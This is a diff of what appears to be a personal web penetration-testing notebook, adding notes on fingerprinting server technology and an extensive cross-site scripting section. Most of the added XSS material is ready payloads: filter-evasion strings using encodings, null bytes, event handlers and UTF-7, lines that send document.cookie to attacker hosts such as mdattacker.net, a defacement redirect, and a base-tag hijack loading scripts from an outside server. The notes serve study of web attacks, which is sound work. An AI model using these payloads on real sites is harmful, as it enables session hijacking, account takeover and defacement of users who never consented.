@@ -152,8 +152,44 @@ Burp Intruder containe a built-in payload list containing a large number of user
 - IP-Address: In addition sometimes the IP Address is used to allow the session for users, geolocation etc... When the server is at back of a load balancer or proxy the IP address is specified in the _X-Forwarded-For_. By adding a suitably crafted _X-Forwarded-For_ you may be able to deliver SQLi or even persistent XSS
 
 #### Identify Server-side technology
+###### Banner Grabbing
+- Templates HTML
+- Custom HTTP Headers
+- URL query string parameter
 
+###### HTTP Fingerprinting
+Install httprint  if you don't have it:
+```
+#This tools was not too much useful.
+sudo apt install httprint
+```
 
+https://net-square.com/httprint_paper.html
+
+###### File Extensions
+- asp -> MicroWebSphere
+- pl -> Perl
+- py -> python
+- dll -> Compiled native code (C or C++)
+- nsf or ntf -> Louts Domino
+
+If the extensions are hidden for the url we may find different error when we add the correct extension (custom template) and when we try with a different extension (standar error)
+
+###### Directory names
+We can guess the technology based in some directories we found.
+- servlet -> Java servlets
+- pls -> Oracle Application Server PL/SQL Gateway
+- cfdocs or cfide -> Cold Fusion
+- SilverStream -> SilverStream web server
+- WebObjects or {function}.woa -> Apple WebObjects
+- rails -> Ruby on Rails
+
+###### Session Tokens
+- JSESSIONID -> Java Platform
+- ASPSESSIONID -> Microsoft IIS server
+- ASP.NET_SessionId -> Microsoft ASP.NET
+- CFID/CFTOKEN -> Cold Fusion
+- PHPSESSID -> PHP
 
 ## Attack vectors
 The different attacks we're going to deploy here and define a methodology are:
@@ -271,14 +307,54 @@ curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/
 
 #### XSS
 An XSS can take control of a remote browser of a victim. We could from delete a specific content to the user to create a new administrator account if the user have enough privileges.
+
+**Varieties**
+- Reflected XSS
+```
+#you send some XSS in the url to other users as
+http://mdsec.net/error/5/Error.ashx?message=Sorry%2c+an+error+occurred
+##for
+http://mdsec.net/error/5/Error.ashx?message=<script>alert("XSS")</script>
+```
+- Stored XSS
+
+- DOM-Based XSS Vulnerabilities:
+This category doens't share the characteristic of display some javascript content and execute code directly in the user browser.
+>portswigger.net
+>DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
+
 Other attack vector could be:
 - Phising with a fake login page
 - Defacement attacks
+```
+#Virtual defacement: Add some content to the page to make the user do some actions he wouldn't
+<script>window.location=”http://www.pastehtml.com/Your_Defacement_link”;</script>
+```
 - DDoS
 - XSS Worm that is propagate from web to web or even from user to user in a same web page.
 - Log out the user session
 - Delete some content of from the web
-- Create an keylogger
+- Create an keylogger o get sensitive information
+	```
+	[Pendiente de buscar recursos]
+	```
+- Capture their browsing history
+	```
+	[Pendiente de buscar recursos]
+	```
+- Port Scanning the local (or not) network!
+	```
+	[Pendiente de buscar recursos]
+	```
+
+------------------------------------------
+**Exploiting any Trust Relationship**
+- The first is send a cookie to another domain (Example in AJAX Request)
+- If the application use forms and the browser have autocomplete enabled with javascript we can get any content that the user have saved in the browser cache and send this information to the malicious server
+-  ActiveX controls 
+
+-----------------------------
+
 - AJAX Request to obtain a session token
 	```
 	<script>
@@ -308,6 +384,8 @@ If you discover some input where you can add html code you can try inject javasc
 
 #### Open an http server in your malicious machine (python3 -m http.server)
 <script>document.write('<img src="http://127.0.0.1:8000/daffi.png?cookie=' + document.cookie + '">')</script>
+###or
+var i=new Image; i.src=”http://mdattacker.net/”+document.cookie;
 
 ### inside a value tag
 <input type="text" name="q2 value="[MyText]" />
@@ -364,8 +442,197 @@ javascript
 The `x.open("POST","func/send.php",true);` create the POST request and with the true we indicate that the request is going to be asynchronous, that means that the browser is not going to get freeze until get the answer.
 The `x.setRequestHeader` is useful to create a more sharp request indicating the headers to use
 
-###### XSS Filters
+
+###### 	Delivery Mechanism for XSS
+[Chapter 12 - The Web Appication Hacker's Book]
+.
+.
+.
+.
+
+###### XSS examples
+- Example 1: A Tag Attribute Value
+```
+<input type=”text” name=”address1” value=”myxsstestdmqlwp”>
+	“><script>alert(1)</script>
+	“ onfocus=”alert(1)
+```
+
+- Example 2: A JavaScript String
+```
+<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>
+	‘; alert(1); var foo=’
+	‘; alert(1); var foo=’//
+```
+- Example 3: An Attribute Containing a URL
+```
+<a href=”myxsstestdmqlwp”>Click here ...</a>
+	javascript:alert(1);
+	”onclick=”javascript:alert(1)
+```
+
+
+
+###### XSS Filters Bypass
 Is common that some characters or expressions are banned in the server-side. How can we bypass it?
+**Basic approach**
+```text
+“><script >alert(document.cookie)</script >
+“><ScRiPt>alert(document.cookie)</ScRiPt>
+“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%00“><script>alert(document.cookie)</script>
+```
+
+**Base64 Encode**
+```
+<object data="data:text/html,<script>alert(1)</script>">
+	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+	<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+	Click here</a>
+```
+
+**Events Handler**
+```text
+<xml onreadystatechange=alert(1)>
+<style onreadystatechange=alert(1)>
+<iframe onreadystatechange=alert(1)>
+<object onerror=alert(1)>
+<object type=image src=valid.gif onreadystatechange=alert(1)></object>
+<img type=image src=valid.gif onreadystatechange=alert(1)>
+<input type=image src=valid.gif onreadystatechange=alert(1)>
+<isindex type=image src=valid.gif onreadystatechange=alert(1)>
+<script onreadystatechange=alert(1)>
+<bgsound onpropertychange=alert(1)>
+<body onbeforeactivate=alert(1)>
+<body onactivate=alert(1)>
+<body onfocusin=alert(1)>
+
+
+### HTML5
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+#this allows events in closing tags
+</a onmousemove=alert(1)>
+#And some new tags
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+```
+
+**Script pseudo protocols**
+Substitute urls for an inline scritp (Could be javascript or others as 	vbs in Internet Explorer)
+```
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+### HTML5
+<form id=test /><button form=test formaction=javascript:alert(1)>
+<event-source src=javascript:alert(1)>
+```
+
+**CSS for XSS**
+In general this is useless nowadays but it's good to know that this exists
+
+
+**Bypassing filters: HTML**
+```text
+<img onerror=alert(1) src=a>
+#######Tags#########
+	<iMg onerror=alert(1) src=a>
+	<[%00]img onerror=alert(1) src=a>
+	<i[%00]mg onerror=alert(1) src=a>
+	#arbitrary tag
+	<x onclick=alert(1) src=a>Click here</x>
+
+	#sustitute spaces!
+	<img/onerror=alert(1) src=a>
+	<img[%09]onerror=alert(1) src=a>
+	<img[%0d]onerror=alert(1) src=a>
+	<img[%0a]onerror=alert(1) src=a>
+	<img/"onerror=alert(1) src=a>
+	<img/'onerror=alert(1) src=a>
+	<img/anyjunk/onerror=alert(1) src=a>
+
+#######Attribute Names#########
+	<img o[%00]nerror=alert(1) src=a>
+
+#######Attribute Delimiters#########
+	<img onerror="alert(1)"src=a>
+	<img onerror='alert(1)'src=a>
+	<img onerror=`alert(1)`src=a>	
+	#Using backticks in the atributes we can disguide the event handler name
+	<img src=`a`onerror=alert(1)> ##This way the server will think that the event handler es called "aonerror" an not "onerror" but the browser will understand correctly
+
+#####Mixing sustitute spaces + attribute delimiter
+	<img onerror="alert(1)"src=a>
+
+
+#####Attribute values
+#We can apply null byte + HTML encode
+##Apply decimal and hexadecimal format and add superfluous leading zeros and ommit the trailing semicolon.
+	<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+	<img onerror=a&#x06c;ert(1) src=a> #hex
+	<img onerror=a&#x006c;ert(1) src=a> #hex
+	<img onerror=a&#x0006c;ert(1) src=a> #hex
+	<img onerror=a&#108;ert(1) src=a> #dec
+	<img onerror=a&#0108;ert(1) src=a> #dec
+	<img onerror=a&#108ert(1) src=a> #dec
+	<img onerror=a&#0108ert(1) src=a> #dec
+
+
+#script tag!
+##Sometimes this works, just add rubbish to the script tag!
+	<script/anyjunk>alert(1)</script>
+
+
+#######Tag brackets bypass with URL encoded (Or double enconde)
+<img onerror=alert(1) src=a>
+	%253cimg%20onerror=alert(1)%20src=a%253e ->URL decode -> %3cimg onerror=alert(1) src=a%3e -> URL decode -> <img onerror=alert(1) src=a>
+
+##Same happend when the application framework translate unusual unicode into the nearest ASCII equivalent
+	«img onerror=alert(1) src=a» ==> %u00AB onerror=alert(1) src=a%u00BB
+	##And its translated to --> <<script>alert(1);//<</script>
+
+######Particularities of each browser
+##The next execution is not correct in javascript,  but in ECMAScript for XML (E4X) but in firefox this works!
+	<script<{alert(1)}/></script>
+```
+
+We have to do a mention to the "base" tag for the attack known as "base tag hijacking".
+Base tag is use to force the browser to resolve an url, even if it's external, the browser resolve and it considers that this url belong to the context of the page! The allow bypass the "insite" options and load a malicious script from out own server!.
+```text
+<base href=”http://mdattacker.net/badscripts/”>
+```
+In general base tag should appear in the header of the HTML pagesbut some browsers, including Firefox allows them in anywhere.
+
+**Character Sets**
+Sometimes you can use non-standar codifications
+```
+<script>alert(document.cookie)</script>
+####UTF-7
+`+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-`
+####US-ASCII
+¿?¿?¿?¿?
+####UTF-16
+¿?¿?¿?¿?
+```
+The callenge here is make to the browser interpret the characters received.
+- You can get this managing the _Content-type_ or its corresponding HTML metatag to force interpret this kind of codifications
+
+**Several inputs to attack**
+We have two inputs that apply that are reflected (or stored) in a webpage as:
+```
+<img src=”image.gif” alt=”[input1]” /> ... [input2]
+
+##to attack
+	input1:[%f0]
+	input2:"onload=alert(1);
+```
+The 0xf0 character is used to define that the next character is composed by two bytes, that means that this is no going to interpret the quote and will not close the string, that way we can insert the input2 in the same string!
+
+
 **String.fromCharCode() function**
 A function in javascript that can be usefull to bypass quotes restrictions and introduce strings
 Copy the next in the javascript console as example:
@@ -397,11 +664,19 @@ For this we have to try create an event inside the tag we're in!
 OnFocus="alert('Hola Mundo!');" />
 ```
 
-###### Some more resources from twitter
+
+
+
+###### Some more resources
 ```text
 Cross site scripting (XSS)
-#bugbounty
 
+#Payloads
+https://github.com/payloadbox/xss-payload-list
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+#bugbounty
+##Twitter
 https://hackerone.com/reports/1264834
 (payload :"><img src=x onerror=alert(document.cookie);.jpg)
 
@@ -541,7 +816,7 @@ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web
 %25 -> %
 %20 -> Space
 %0a -> New line
-%00 -> Null byte
+%00 -> Null byte [ussually works to bypass the WAFs due to that the WAFs commonly have been programmed in native code. The null byte finish the string where this is found]
 
 #Characters we should encode in a malicious http request
 space % ? & = ; + #
